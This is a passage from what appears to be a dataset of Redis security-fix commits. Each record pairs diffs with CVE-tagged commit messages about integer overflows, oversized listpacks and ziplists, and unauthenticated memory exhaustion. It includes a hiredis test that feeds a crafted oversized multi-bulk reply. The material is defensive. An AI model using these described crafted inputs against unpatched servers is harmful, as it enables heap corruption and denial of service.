    \ &&\n+            lpSafeToAdd(NULL, totelelen))\n+        {\n+            zsetConvert(o,OBJ_ENCODING_LISTPACK);\n\
    +        }\n     } else if (rdbtype == RDB_TYPE_HASH) {\n         uint64_t len;\n\
    \         int ret;\n@@ -1862,19 +1866,28 @@ robj *rdbLoadObject(int rdbtype, rio\
    \ *rdb, sds key, int dbid, int *error) {\n                 }\n             }\n\
    \ \n-            /* Add pair to listpack */\n-            o->ptr = lpAppend(o->ptr,\
    \ (unsigned char*)field, sdslen(field));\n-            o->ptr = lpAppend(o->ptr,\
    \ (unsigned char*)value, sdslen(value));\n-\n             /* Convert to hash table\
    \ if size threshold is exceeded */\n             if (sdslen(field) > server.hash_max_listpack_value\
    \ ||\n-                sdslen(value) > server.hash_max_listpack_value)\n+    \
    \            sdslen(value) > server.hash_max_listpack_value ||\n+            \
    \    !lpSafeToAdd(o->ptr, sdslen(field)+sdslen(value)))\n             {\n-   \
    \             sdsfree(field);\n-                sdsfree(value);\n            \
    \     hashTypeConvert(o, OBJ_ENCODING_HT);\n+                ret = dictAdd((dict*)o->ptr,\
    \ field, value);\n+                if (ret == DICT_ERR) {\n+                 \
    \   rdbReportCorruptRDB(\"Duplicate hash fields detected\");\n+              \
    \      if (dupSearchDict) dictRelease(dupSearchDict);\n+                    sdsfree(value);\n\
    +                    sdsfree(field);\n+                    decrRefCount(o);\n\
    +                    return NULL;\n+                }\n                 break;\n\
    \             }\n+\n+            /* Add pair to listpack */\n+            o->ptr\
    \ = lpAppend(o->ptr, (unsigned char*)field, sdslen(field));\n+            o->ptr\
    \ = lpAppend(o->ptr, (unsigned char*)value, sdslen(value));\n+\n             sdsfree(field);\n\
    \             sdsfree(value);\n         }\n@@ -1993,7 +2006,7 @@ robj *rdbLoadObject(int\
    \ rdbtype, rio *rdb, sds key, int dbid, int *error) {\n                 /* Convert\
    \ to ziplist encoded hash. This must be deprecated\n                  * when loading\
    \ dumps created by Redis 2.4 gets deprecated. */\n                 {\n-      \
    \              unsigned char *zl = lpNew(0);\n+                    unsigned char\
    \ *lp = lpNew(0);\n                     unsigned char *zi = zipmapRewind(o->ptr);\n\
    \                     unsigned char *fstr, *vstr;\n                     unsigned\
    \ int flen, vlen;\n@@ -2003,12 +2016,11 @@ robj *rdbLoadObject(int rdbtype, rio\
    \ *rdb, sds key, int dbid, int *error) {\n                     while ((zi = zipmapNext(zi,\
    \ &fstr, &flen, &vstr, &vlen)) != NULL) {\n                         if (flen >\
    \ maxlen) maxlen = flen;\n                         if (vlen > maxlen) maxlen =\
    \ vlen;\n-                        zl = lpAppend(zl, fstr, flen);\n-          \
    \              zl = lpAppend(zl, vstr, vlen);\n \n                         /*\
    \ search for duplicate records */\n                         sds field = sdstrynewlen(fstr,\
    \ flen);\n-                        if (!field || dictAdd(dupSearchDict, field,\
    \ NULL) != DICT_OK) {\n+                        if (!field || dictAdd(dupSearchDict,\
    \ field, NULL) != DICT_OK ||\n+                            !lpSafeToAdd(lp, (size_t)flen\
    \ + vlen)) {\n                             rdbReportCorruptRDB(\"Hash zipmap with\
    \ dup elements, or big length (%u)\", flen);\n                             dictRelease(dupSearchDict);\n\
    \                             sdsfree(field);\n@@ -2017,11 +2029,14 @@ robj *rdbLoadObject(int\
    \ rdbtype, rio *rdb, sds key, int dbid, int *error) {\n                      \
    \       decrRefCount(o);\n                             return NULL;\n        \
    \                 }\n+\n+                        lp = lpAppend(lp, fstr, flen);\n\
    +                        lp = lpAppend(lp, vstr, vlen);\n                    \
    \ }\n \n                     dictRelease(dupSearchDict);\n                   \
    \  zfree(o->ptr);\n-                    o->ptr = zl;\n+                    o->ptr\
    \ = lp;\n                     o->type = OBJ_HASH;\n                     o->encoding\
    \ = OBJ_ENCODING_LISTPACK;\n "
  - "--- a/src/t_hash.c\n+++ b/src/t_hash.c\n@@ -39,17 +39,22 @@\n  * as their string\
    \ length can be queried in constant time. */\n void hashTypeTryConversion(robj\
    \ *o, robj **argv, int start, int end) {\n     int i;\n+    size_t sum = 0;\n\
    \ \n     if (o->encoding != OBJ_ENCODING_LISTPACK) return;\n \n     for (i = start;\
    \ i <= end; i++) {\n-        if (sdsEncodedObject(argv[i]) &&\n-            sdslen(argv[i]->ptr)\
    \ > server.hash_max_listpack_value)\n-        {\n+        if (!sdsEncodedObject(argv[i]))\n\
    +            continue;\n+        size_t len = sdslen(argv[i]->ptr);\n+       \
    \ if (len > server.hash_max_listpack_value) {\n             hashTypeConvert(o,\
    \ OBJ_ENCODING_HT);\n-            break;\n+            return;\n         }\n+\
    \        sum += len;\n     }\n+    if (!lpSafeToAdd(o->ptr, sum))\n+        hashTypeConvert(o,\
    \ OBJ_ENCODING_HT);\n }\n \n /* Get the value from a listpack encoded hash, identified\
    \ by field."
  - "--- a/src/t_list.c\n+++ b/src/t_list.c\n@@ -29,6 +29,8 @@\n \n #include \"server.h\"\
    \n \n+#define LIST_MAX_ITEM_SIZE ((1ull<<32)-1024)\n+\n /*-----------------------------------------------------------------------------\n\
    \  * List API\n  *----------------------------------------------------------------------------*/\n\
    @@ -254,6 +256,13 @@ int listTypeDelRange(robj *subject, long start, long count)\
    \ {\n void pushGenericCommand(client *c, int where, int xx) {\n     int j;\n \n\
    +    for (j = 2; j < c->argc; j++) {\n+        if (sdslen(c->argv[j]->ptr) > LIST_MAX_ITEM_SIZE)\
    \ {\n+            addReplyError(c, \"Element too large\");\n+            return;\n\
    +        }\n+    }\n+\n     robj *lobj = lookupKeyWrite(c->db, c->argv[1]);\n\
    \     if (checkType(c,lobj,OBJ_LIST)) return;\n     if (!lobj) {\n@@ -317,6 +326,11\
    \ @@ void linsertCommand(client *c) {\n         return;\n     }\n \n+    if (sdslen(c->argv[4]->ptr)\
    \ > LIST_MAX_ITEM_SIZE) {\n+        addReplyError(c, \"Element too large\");\n\
    +        return;\n+    }\n+\n     if ((subject = lookupKeyWriteOrReply(c,c->argv[1],shared.czero))\
    \ == NULL ||\n         checkType(c,subject,OBJ_LIST)) return;\n \n@@ -384,6 +398,11\
    \ @@ void lsetCommand(client *c) {\n     long index;\n     robj *value = c->argv[3];\n\
    \ \n+    if (sdslen(value->ptr) > LIST_MAX_ITEM_SIZE) {\n+        addReplyError(c,\
    \ \"Element too large\");\n+        return;\n+    }\n+\n     if ((getLongFromObjectOrReply(c,\
    \ c->argv[2], &index, NULL) != C_OK))\n         return;\n \n@@ -683,6 +702,11\
    \ @@ void lposCommand(client *c) {\n     int direction = LIST_TAIL;\n     long\
    \ rank = 1, count = -1, maxlen = 0; /* Count -1: option not given. */\n \n+  \
    \  if (sdslen(ele->ptr) > LIST_MAX_ITEM_SIZE) {\n+        addReplyError(c, \"\
    Element too large\");\n+        return;\n+    }\n+\n     /* Parse the optional\
    \ arguments. */\n     for (int j = 3; j < c->argc; j++) {\n         char *opt\
    \ = c->argv[j]->ptr;\n@@ -778,6 +802,11 @@ void lremCommand(client *c) {\n   \
    \  long toremove;\n     long removed = 0;\n \n+    if (sdslen(obj->ptr) > LIST_MAX_ITEM_SIZE)\
    \ {\n+        addReplyError(c, \"Element too large\");\n+        return;\n+  \
    \  }\n+\n     if ((getLongFromObjectOrReply(c, c->argv[2], &toremove, NULL) !=\
    \ C_OK))\n         return;\n "
  - "--- a/src/t_stream.c\n+++ b/src/t_stream.c\n@@ -47,6 +47,12 @@\n  * setting stream_node_max_bytes\
    \ to a huge number. */\n #define STREAM_LISTPACK_MAX_PRE_ALLOCATE 4096\n \n+/*\
    \ Don't let listpacks grow too big, even if the user config allows it.\n+ * doing\
    \ so can lead to an overflow (trying to store more than 32bit length\n+ * into\
    \ the listpack header), or actually an assertion since lpInsert\n+ * will return\
    \ NULL. */\n+#define STREAM_LISTPACK_MAX_SIZE (1<<30)\n+\n void streamFreeCG(streamCG\
    \ *cg);\n void streamFreeNACK(streamNACK *na);\n size_t streamReplyWithRangeFromConsumerPEL(client\
    \ *c, stream *s, streamID *start, streamID *end, size_t count, streamConsumer\
    \ *consumer);\n@@ -415,8 +421,11 @@ void streamGetEdgeID(stream *s, int first,\
    \ streamID *edge_id)\n  *\n  * The function returns C_OK if the item was added,\
    \ this is always true\n  * if the ID was generated by the function. However the\
    \ function may return\n- * C_ERR if an ID was given via 'use_id', but adding it\
    \ failed since the\n- * current top ID is greater or equal. */\n+ * C_ERR in several\
    \ cases:\n+ * 1. If an ID was given via 'use_id', but adding it failed since the\n\
    + *    current top ID is greater or equal. errno will be set to EDOM.\n+ * 2.\
    \ If a size of a single element or the sum of the elements is too big to\n+ *\
    \    be stored into the stream. errno will be set to ERANGE. */\n int streamAppendItem(stream\
    \ *s, robj **argv, int64_t numfields, streamID *added_id, streamID *use_id) {\n\
    \ \n     /* Generate the new entry ID. */\n@@ -430,7 +439,23 @@ int streamAppendItem(stream\
    \ *s, robj **argv, int64_t numfields, streamID *added_\n      * or return an error.\
    \ Automatically generated IDs might\n      * overflow (and wrap-around) when incrementing\
    \ the sequence\n        part. */\n-    if (streamCompareID(&id,&s->last_id) <=\
    \ 0) return C_ERR;\n+    if (streamCompareID(&id,&s->last_id) <= 0) {\n+     \
    \   errno = EDOM;\n+        return C_ERR;\n+    }\n+\n+    /* Avoid overflow when\
    \ trying to add an element to the stream (listpack\n+     * can only host up to\
    \ 32bit length sttrings, and also a total listpack size\n+     * can't be bigger\
    \ than 32bit length. */\n+    size_t totelelen = 0;\n+    for (int64_t i = 0;\
    \ i < numfields*2; i++) {\n+        sds ele = argv[i]->ptr;\n+        totelelen\
    \ += sdslen(ele);\n+    }\n+    if (totelelen > STREAM_LISTPACK_MAX_SIZE) {\n\
    +        errno = ERANGE;\n+        return C_ERR;\n+    }\n \n     /* Add the new\
    \ entry. */\n     raxIterator ri;\n@@ -489,9 +514,10 @@ int streamAppendItem(stream\
    \ *s, robj **argv, int64_t numfields, streamID *added_\n      * if we need to\
    \ switch to the next one. 'lp' will be set to NULL if\n      * the current node\
    \ is full. */\n     if (lp != NULL) {\n-        if (server.stream_node_max_bytes\
    \ &&\n-            lp_bytes >= server.stream_node_max_bytes)\n-        {\n+  \
    \      size_t node_max_bytes = server.stream_node_max_bytes;\n+        if (node_max_bytes\
    \ == 0 || node_max_bytes > STREAM_LISTPACK_MAX_SIZE)\n+            node_max_bytes\
    \ = STREAM_LISTPACK_MAX_SIZE;\n+        if (lp_bytes + totelelen >= node_max_bytes)\
    \ {\n             lp = NULL;\n         } else if (server.stream_node_max_entries)\
    \ {\n             unsigned char *lp_ele = lpFirst(lp);\n@@ -1782,11 +1808,13 @@\
    \ void xaddCommand(client *c) {\n     /* Append using the low level function and\
    \ return the ID. */\n     streamID id;\n     if (streamAppendItem(s,c->argv+field_pos,(c->argc-field_pos)/2,\n\
    -        &id, parsed_args.id_given ? &parsed_args.id : NULL)\n-        == C_ERR)\n\
    +        &id, parsed_args.id_given ? &parsed_args.id : NULL) == C_ERR)\n     {\n\
    -        addReplyError(c,\"The ID specified in XADD is equal or smaller than the\
    \ \"\n-                        \"target stream top item\");\n+        if (errno\
    \ == EDOM)\n+            addReplyError(c,\"The ID specified in XADD is equal or\
    \ smaller than \"\n+                            \"the target stream top item\"\
    );\n+        else\n+            addReplyError(c,\"Elements are too large to be\
    \ stored\");\n         return;\n     }\n     addReplyStreamID(c,&id);"
  - "--- a/src/t_zset.c\n+++ b/src/t_zset.c\n@@ -1227,15 +1227,18 @@ void zsetConvert(robj\
    \ *zobj, int encoding) {\n }\n \n /* Convert the sorted set object into a listpack\
    \ if it is not already a listpack\n- * and if the number of elements and the maximum\
    \ element size is within the\n- * expected ranges. */\n-void zsetConvertToListpackIfNeeded(robj\
    \ *zobj, size_t maxelelen) {\n+ * and if the number of elements and the maximum\
    \ element size and total elements size\n+ * are within the expected ranges. */\n\
    +void zsetConvertToListpackIfNeeded(robj *zobj, size_t maxelelen, size_t totelelen)\
    \ {\n     if (zobj->encoding == OBJ_ENCODING_LISTPACK) return;\n     zset *zset\
    \ = zobj->ptr;\n \n     if (zset->zsl->length <= server.zset_max_listpack_entries\
    \ &&\n-        maxelelen <= server.zset_max_listpack_value)\n-            zsetConvert(zobj,OBJ_ENCODING_LISTPACK);\n\
    +        maxelelen <= server.zset_max_listpack_value &&\n+        lpSafeToAdd(NULL,\
    \ totelelen))\n+    {\n+        zsetConvert(zobj,OBJ_ENCODING_LISTPACK);\n+  \
    \  }\n }\n \n /* Return (by reference) the score of the specified member of the\
    \ sorted set\n@@ -1355,20 +1358,28 @@ int zsetAdd(robj *zobj, double score, sds\
    \ ele, int in_flags, int *out_flags, dou\n             }\n             return\
    \ 1;\n         } else if (!xx) {\n-            /* Optimize: check if the element\
    \ is too large or the list\n+            /* check if the element is too large\
    \ or the list\n              * becomes too long *before* executing zzlInsert.\
    \ */\n-            zobj->ptr = zzlInsert(zobj->ptr,ele,score);\n-            if\
    \ (zzlLength(zobj->ptr) > server.zset_max_listpack_entries ||\n-             \
    \   sdslen(ele) > server.zset_max_listpack_value)\n+            if (zzlLength(zobj->ptr)+1\
    \ > server.zset_max_listpack_entries ||\n+                sdslen(ele) > server.zset_max_listpack_value\
    \ ||\n+                !lpSafeToAdd(zobj->ptr, sdslen(ele)))\n+            {\n\
    \                 zsetConvert(zobj,OBJ_ENCODING_SKIPLIST);\n-            if (newscore)\
    \ *newscore = score;\n-            *out_flags |= ZADD_OUT_ADDED;\n-          \
    \  return 1;\n+            } else {\n+                zobj->ptr = zzlInsert(zobj->ptr,ele,score);\n\
    +                if (newscore) *newscore = score;\n+                *out_flags\
    \ |= ZADD_OUT_ADDED;\n+                return 1;\n+            }\n         } else\
    \ {\n             *out_flags |= ZADD_OUT_NOP;\n             return 1;\n      \
    \   }\n-    } else if (zobj->encoding == OBJ_ENCODING_SKIPLIST) {\n+    }\n+\n\
    +    /* Note that the above block handling ziplist would have either returned\
    \ or\n+     * converted the key to skiplist. */\n+    if (zobj->encoding == OBJ_ENCODING_SKIPLIST)\
    \ {\n         zset *zs = zobj->ptr;\n         zskiplistNode *znode;\n        \
    \ dictEntry *de;\n@@ -2304,7 +2315,7 @@ inline static void zunionInterAggregate(double\
    \ *target, double val, int aggregat\n     }\n }\n \n-static int zsetDictGetMaxElementLength(dict\
    \ *d) {\n+static size_t zsetDictGetMaxElementLength(dict *d, size_t *totallen)\
    \ {\n     dictIterator *di;\n     dictEntry *de;\n     size_t maxelelen = 0;\n\
    @@ -2314,14 +2325,16 @@ static int zsetDictGetMaxElementLength(dict *d) {\n  \
    \   while((de = dictNext(di)) != NULL) {\n         sds ele = dictGetKey(de);\n\
    \         if (sdslen(ele) > maxelelen) maxelelen = sdslen(ele);\n+        if (totallen)\n\
    +            (*totallen) += sdslen(ele);\n     }\n \n     dictReleaseIterator(di);\n\
    \ \n     return maxelelen;\n }\n \n-static void zdiffAlgorithm1(zsetopsrc *src,\
    \ long setnum, zset *dstzset, size_t *maxelelen) {\n+static void zdiffAlgorithm1(zsetopsrc\
    \ *src, long setnum, zset *dstzset, size_t *maxelelen, size_t *totelelen) {\n\
    \     /* DIFF Algorithm 1:\n      *\n      * We perform the diff by iterating\
    \ all the elements of the first set,\n@@ -2369,13 +2382,14 @@ static void zdiffAlgorithm1(zsetopsrc\
    \ *src, long setnum, zset *dstzset, size_t *\n             znode = zslInsert(dstzset->zsl,zval.score,tmp);\n\
    \             dictAdd(dstzset->dict,tmp,&znode->score);\n             if (sdslen(tmp)\
    \ > *maxelelen) *maxelelen = sdslen(tmp);\n+            (*totelelen) += sdslen(tmp);\n\
    \         }\n     }\n     zuiClearIterator(&src[0]);\n }\n \n \n-static void zdiffAlgorithm2(zsetopsrc\
    \ *src, long setnum, zset *dstzset, size_t *maxelelen) {\n+static void zdiffAlgorithm2(zsetopsrc\
    \ *src, long setnum, zset *dstzset, size_t *maxelelen, size_t *totelelen) {\n\
    \     /* DIFF Algorithm 2:\n      *\n      * Add all the elements of the first\
    \ set to the auxiliary set.\n@@ -2429,7 +2443,7 @@ static void zdiffAlgorithm2(zsetopsrc\
    \ *src, long setnum, zset *dstzset, size_t *\n \n     /* Using this algorithm,\
    \ we can't calculate the max element as we go,\n      * we have to iterate through\
    \ all elements to find the max one after. */\n-    *maxelelen = zsetDictGetMaxElementLength(dstzset->dict);\n\
    +    *maxelelen = zsetDictGetMaxElementLength(dstzset->dict, totelelen);\n }\n\
    \ \n static int zsetChooseDiffAlgorithm(zsetopsrc *src, long setnum) {\n@@ -2466,14\
    \ +2480,14 @@ static int zsetChooseDiffAlgorithm(zsetopsrc *src, long setnum)\
    \ {\n     return (algo_one_work <= algo_two_work) ? 1 : 2;\n }\n \n-static void\
    \ zdiff(zsetopsrc *src, long setnum, zset *dstzset, size_t *maxelelen) {\n+static\
    \ void zdiff(zsetopsrc *src, long setnum, zset *dstzset, size_t *maxelelen, size_t\
    \ *totelelen) {\n     /* Skip everything if the smallest input is empty. */\n\
    \     if (zuiLength(&src[0]) > 0) {\n         int diff_algo = zsetChooseDiffAlgorithm(src,\
    \ setnum);\n         if (diff_algo == 1) {\n-            zdiffAlgorithm1(src,\
    \ setnum, dstzset, maxelelen);\n+            zdiffAlgorithm1(src, setnum, dstzset,\
    \ maxelelen, totelelen);\n         } else if (diff_algo == 2) {\n-           \
    \ zdiffAlgorithm2(src, setnum, dstzset, maxelelen);\n+            zdiffAlgorithm2(src,\
    \ setnum, dstzset, maxelelen, totelelen);\n         } else if (diff_algo != 0)\
    \ {\n             serverPanic(\"Unknown algorithm\");\n         }\n@@ -2510,7\
    \ +2524,7 @@ void zunionInterDiffGenericCommand(client *c, robj *dstkey, int numkeysIndex,\
    \ in\n     zsetopsrc *src;\n     zsetopval zval;\n     sds tmp;\n-    size_t maxelelen\
    \ = 0;\n+    size_t maxelelen = 0, totelelen = 0;\n     robj *dstobj;\n     zset\
    \ *dstzset;\n     zskiplistNode *znode;\n@@ -2668,6 +2682,7 @@ void zunionInterDiffGenericCommand(client\
    \ *c, robj *dstkey, int numkeysIndex, in\n                     tmp = zuiNewSdsFromValue(&zval);\n\
    \                     znode = zslInsert(dstzset->zsl,score,tmp);\n           \
    \          dictAdd(dstzset->dict,tmp,&znode->score);\n+                    totelelen\
    \ += sdslen(tmp);\n                     if (sdslen(tmp) > maxelelen) maxelelen\
    \ = sdslen(tmp);\n                 }\n             }\n@@ -2704,6 +2719,7 @@ void\
    \ zunionInterDiffGenericCommand(client *c, robj *dstkey, int numkeysIndex, in\n\
    \                     /* Remember the longest single element encountered,\n  \
    \                    * to understand if it's possible to convert to listpack\n\
    \                      * at the end. */\n+                     totelelen += sdslen(tmp);\n\
    \                      if (sdslen(tmp) > maxelelen) maxelelen = sdslen(tmp);\n\
    \                     /* Update the element with its initial score. */\n     \
    \                dictSetKey(accumulator, de, tmp);\n@@ -2738,14 +2754,14 @@ void\
    \ zunionInterDiffGenericCommand(client *c, robj *dstkey, int numkeysIndex, in\n\
    \         dictReleaseIterator(di);\n         dictRelease(accumulator);\n     }\
    \ else if (op == SET_OP_DIFF) {\n-        zdiff(src, setnum, dstzset, &maxelelen);\n\
    +        zdiff(src, setnum, dstzset, &maxelelen, &totelelen);\n     } else {\n\
    \         serverPanic(\"Unknown operator\");\n     }\n \n     if (dstkey) {\n\
    \         if (dstzset->zsl->length) {\n-            zsetConvertToListpackIfNeeded(dstobj,\
    \ maxelelen);\n+            zsetConvertToListpackIfNeeded(dstobj, maxelelen, totelelen);\n\
    \             setKey(c, c->db, dstkey, dstobj);\n             addReplyLongLong(c,\
    \ zsetLength(dstobj));\n             notifyKeyspaceEvent(NOTIFY_ZSET,"
  - "--- a/src/ziplist.c\n+++ b/src/ziplist.c\n@@ -267,6 +267,17 @@\n         ZIPLIST_LENGTH(zl)\
    \ = intrev16ifbe(intrev16ifbe(ZIPLIST_LENGTH(zl))+incr); \\\n }\n \n+/* Don't\
    \ let ziplists grow over 1GB in any case, don't wanna risk overflow in\n+ * zlbytes\
    \ */\n+#define ZIPLIST_MAX_SAFETY_SIZE (1<<30)\n+int ziplistSafeToAdd(unsigned\
    \ char* zl, size_t add) {\n+    size_t len = zl? ziplistBlobLen(zl): 0;\n+   \
    \ if (len + add > ZIPLIST_MAX_SAFETY_SIZE)\n+        return 0;\n+    return 1;\n\
    +}\n+\n+\n /* We use this function to receive information about a ziplist entry.\n\
    \  * Note that this is not how the data is actually encoded, is just what we\n\
    \  * get filled by a function in order to operate more easily. */\n@@ -709,7 +720,8\
    \ @@ unsigned char *ziplistNew(void) {\n }\n \n /* Resize the ziplist. */\n-unsigned\
    \ char *ziplistResize(unsigned char *zl, unsigned int len) {\n+unsigned char *ziplistResize(unsigned\
    \ char *zl, size_t len) {\n+    assert(len < UINT32_MAX);\n     zl = zrealloc(zl,len);\n\
    \     ZIPLIST_BYTES(zl) = intrev32ifbe(len);\n     zl[len-1] = ZIP_END;\n@@ -1070,6\
    \ +1082,9 @@ unsigned char *ziplistMerge(unsigned char **first, unsigned char\
    \ **second) {\n     /* Combined zl length should be limited within UINT16_MAX\
    \ */\n     zllength = zllength < UINT16_MAX ? zllength : UINT16_MAX;\n \n+   \
    \ /* larger values can't be stored into ZIPLIST_BYTES */\n+    assert(zlbytes\
    \ < UINT32_MAX);\n+\n     /* Save offset positions before we start ripping memory\
    \ apart. */\n     size_t first_offset = intrev32ifbe(ZIPLIST_TAIL_OFFSET(*first));\n\
    \     size_t second_offset = intrev32ifbe(ZIPLIST_TAIL_OFFSET(*second));"
  commit_message: "Fix ziplist and listpack overflows and truncations (CVE-2021-32627,\
    \ CVE-2021-32628) (#9589)\n\n- fix possible heap corruption in ziplist and listpack\
    \ resulting by trying to\r\n  allocate more than the maximum size of 4GB.\r\n\
    - prevent ziplist (hash and zset) from reaching size of above 1GB, will be\r\n\
    \  converted to HT encoding, that's not a useful size.\r\n- prevent listpack (stream)\
    \ from reaching size of above 1GB.\r\n- XADD will start a new listpack if the\
    \ new record may cause the previous\r\n  listpack to grow over 1GB.\r\n- XADD\
    \ will respond with an error if a single stream record is over 1GB\r\n- List type\
    \ (ziplist in quicklist) was truncating strings that were over 4GB,\r\n  now it'll\
    \ respond with an error.\r\n\r\nCo-authored-by: sundb <sundbcn@gmail.com>"
  commit_sha: c5e6a6204c4cf57f85e7c83a9b4e99f1a7204fd2
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/networking.c\n+++ b/src/networking.c\n@@ -107,6 +107,15 @@ static void\
    \ clientSetDefaultAuth(client *c) {\n                        !(c->user->flags\
    \ & USER_FLAG_DISABLED);\n }\n \n+int authRequired(client *c) {\n+    /* Check\
    \ if the user is authenticated. This check is skipped in case\n+     * the default\
    \ user is flagged as \"nopass\" and is active. */\n+    int auth_required = (!(DefaultUser->flags\
    \ & USER_FLAG_NOPASS) ||\n+                          (DefaultUser->flags & USER_FLAG_DISABLED))\
    \ &&\n+                        !c->authenticated;\n+    return auth_required;\n\
    +}\n+\n client *createClient(connection *conn) {\n     client *c = zmalloc(sizeof(client));\n\
    \ \n@@ -1913,6 +1922,10 @@ int processMultibulkBuffer(client *c) {\n         \
    \    addReplyError(c,\"Protocol error: invalid multibulk length\");\n        \
    \     setProtocolError(\"invalid mbulk count\",c);\n             return C_ERR;\n\
    +        } else if (ll > 10 && authRequired(c)) {\n+            addReplyError(c,\
    \ \"Protocol error: unauthenticated multibulk length\");\n+            setProtocolError(\"\
    unauth mbulk count\", c);\n+            return C_ERR;\n         }\n \n       \
    \  c->qb_pos = (newline-c->querybuf)+2;\n@@ -1961,6 +1974,10 @@ int processMultibulkBuffer(client\
    \ *c) {\n                 addReplyError(c,\"Protocol error: invalid bulk length\"\
    );\n                 setProtocolError(\"invalid bulk length\",c);\n          \
    \       return C_ERR;\n+            } else if (ll > 16384 && authRequired(c))\
    \ {\n+                addReplyError(c, \"Protocol error: unauthenticated bulk\
    \ length\");\n+                setProtocolError(\"unauth bulk length\", c);\n\
    +                return C_ERR;\n             }\n \n             c->qb_pos = newline-c->querybuf+2;"
  - "--- a/src/server.c\n+++ b/src/server.c\n@@ -4623,13 +4623,8 @@ int processCommand(client\
    \ *c) {\n     int is_may_replicate_command = (c->cmd->flags & (CMD_WRITE | CMD_MAY_REPLICATE))\
    \ ||\n                                    (c->cmd->proc == execCommand && (c->mstate.cmd_flags\
    \ & (CMD_WRITE | CMD_MAY_REPLICATE)));\n \n-    /* Check if the user is authenticated.\
    \ This check is skipped in case\n-     * the default user is flagged as \"nopass\"\
    \ and is active. */\n-    int auth_required = (!(DefaultUser->flags & USER_FLAG_NOPASS)\
    \ ||\n-                          (DefaultUser->flags & USER_FLAG_DISABLED)) &&\n\
    -                        !c->authenticated;\n-    if (auth_required) {\n-    \
    \    /* AUTH and HELLO and no auth modules are valid even in\n+    if (authRequired(c))\
    \ {\n+        /* AUTH and HELLO and no auth commands are valid even in\n     \
    \     * non-authenticated state. */\n         if (!(c->cmd->flags & CMD_NO_AUTH))\
    \ {\n             rejectCommand(c,shared.noautherr);"
  commit_message: "Prevent unauthenticated client from easily consuming lots of memory\
    \ (CVE-2021-32675) (#9588)\n\nThis change sets a low limit for multibulk and bulk\
    \ length in the\r\nprotocol for unauthenticated connections, so that they can't\
    \ easily\r\ncause redis to allocate massive amounts of memory by sending just\
    \ a few\r\ncharacters on the network.\r\nThe new limits are 10 arguments of 16kb\
    \ each (instead of 1m of 512mb)"
  commit_sha: fba15850e5c31666e4c3560a3be7fd034fa7e2b6
  repo_name: redis/redis
- commit_diff:
  - "--- a/deps/hiredis/hiredis.c\n+++ b/deps/hiredis/hiredis.c\n@@ -174,6 +174,7\
    \ @@ static void *createArrayObject(const redisReadTask *task, size_t elements)\
    \ {\n         return NULL;\n \n     if (elements > 0) {\n+        if (SIZE_MAX\
    \ / sizeof(redisReply*) < elements) return NULL;  /* Don't overflow */\n     \
    \    r->element = hi_calloc(elements,sizeof(redisReply*));\n         if (r->element\
    \ == NULL) {\n             freeReplyObject(r);"
  - "--- a/deps/hiredis/test.c\n+++ b/deps/hiredis/test.c\n@@ -498,6 +498,20 @@ static\
    \ void test_reply_reader(void) {\n     freeReplyObject(reply);\n     redisReaderFree(reader);\n\
    \ \n+    test(\"Multi-bulk never overflows regardless of maxelements: \");\n+\
    \    size_t bad_mbulk_len = (SIZE_MAX / sizeof(void *)) + 3;\n+    char bad_mbulk_reply[100];\n\
    +    snprintf(bad_mbulk_reply, sizeof(bad_mbulk_reply), \"*%llu\\r\\n+asdf\\r\\\
    n\",\n+        (unsigned long long) bad_mbulk_len);\n+\n+    reader = redisReaderCreate();\n\
    +    reader->maxelements = 0;    /* Don't rely on default limit */\n+    redisReaderFeed(reader,\
    \ bad_mbulk_reply, strlen(bad_mbulk_reply));\n+    ret = redisReaderGetReply(reader,&reply);\n\
    +    test_cond(ret == REDIS_ERR && strcasecmp(reader->errstr, \"Out of memory\"\
    ) == 0);\n+    freeReplyObject(reply);\n+    redisReaderFree(reader);\n+\n #if\
    \ LLONG_MAX > SIZE_MAX\n     test(\"Set error when array > SIZE_MAX: \");\n  \
    \   reader = redisReaderCreate();"
  commit_message: "Fix redis-cli / redis-sential overflow on some platforms (CVE-2021-32762)\
    \ (#9587)\n\nThe redis-cli command line tool and redis-sentinel service may be\
    \ vulnerable\r\nto integer overflow when parsing specially crafted large multi-bulk\
    \ network\r\nreplies. This is a result of a vulnerability in the underlying hiredis\r\
    \nlibrary which does not perform an overflow check before calling the calloc()\r\
    \nheap allocation function.\r\n\r\nThis issue only impacts systems with heap allocators\
    \ that do not perform their\r\nown overflow checks. Most modern systems do and\
    \ are therefore not likely to\r\nbe affected. Furthermore, by default redis-sentinel\
    \ uses the jemalloc allocator\r\nwhich is also not vulnerable.\r\n\r\nCo-authored-by:\
    \ Yossi Gottlieb <yossigo@gmail.com>"
  commit_sha: 0215324a66af949be39b34be2d55143232c1cb71
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/intset.c\n+++ b/src/intset.c\n@@ -104,7 +104,8 @@ intset *intsetNew(void)\
    \ {\n \n /* Resize the intset */\n static intset *intsetResize(intset *is, uint32_t\
    \ len) {\n-    uint32_t size = len*intrev32ifbe(is->encoding);\n+    uint64_t\
    \ size = (uint64_t)len*intrev32ifbe(is->encoding);\n+    assert(size <= SIZE_MAX\
    \ - sizeof(intset));\n     is = zrealloc(is,sizeof(intset)+size);\n     return\
    \ is;\n }"
  - "--- a/src/rdb.c\n+++ b/src/rdb.c\n@@ -1690,7 +1690,9 @@ robj *rdbLoadObject(int\
    \ rdbtype, rio *rdb, sds key, int dbid, int *error) {\n         if (len == 0)\
    \ goto emptykey;\n \n         /* Use a regular set when there are too many entries.\
    \ */\n-        if (len > server.set_max_intset_entries) {\n+        size_t max_entries\
    \ = server.set_max_intset_entries;\n+        if (max_entries >= 1<<30) max_entries\
    \ = 1<<30;\n+        if (len > max_entries) {\n             o = createSetObject();\n\
    \             /* It's faster to expand the dict to the right size asap in order\n\
    \              * to avoid rehashing */"
  - "--- a/src/t_set.c\n+++ b/src/t_set.c\n@@ -66,7 +66,10 @@ int setTypeAdd(robj\
    \ *subject, sds value) {\n             if (success) {\n                 /* Convert\
    \ to regular set when the intset contains\n                  * too many entries.\
    \ */\n-                if (intsetLen(subject->ptr) > server.set_max_intset_entries)\n\
    +                size_t max_entries = server.set_max_intset_entries;\n+      \
    \          /* limit to 1G entries due to intset internals. */\n+             \
    \   if (max_entries >= 1<<30) max_entries = 1<<30;\n+                if (intsetLen(subject->ptr)\
    \ > max_entries)\n                     setTypeConvert(subject,OBJ_ENCODING_HT);\n\
    \                 return 1;\n             }"
  commit_message: "Fix Integer overflow issue with intsets (CVE-2021-32687) (#9586)\n\
    \nThe vulnerability involves changing the default set-max-intset-entries\r\nconfiguration\
    \ parameter to a very large value and constructing specially\r\ncrafted commands\
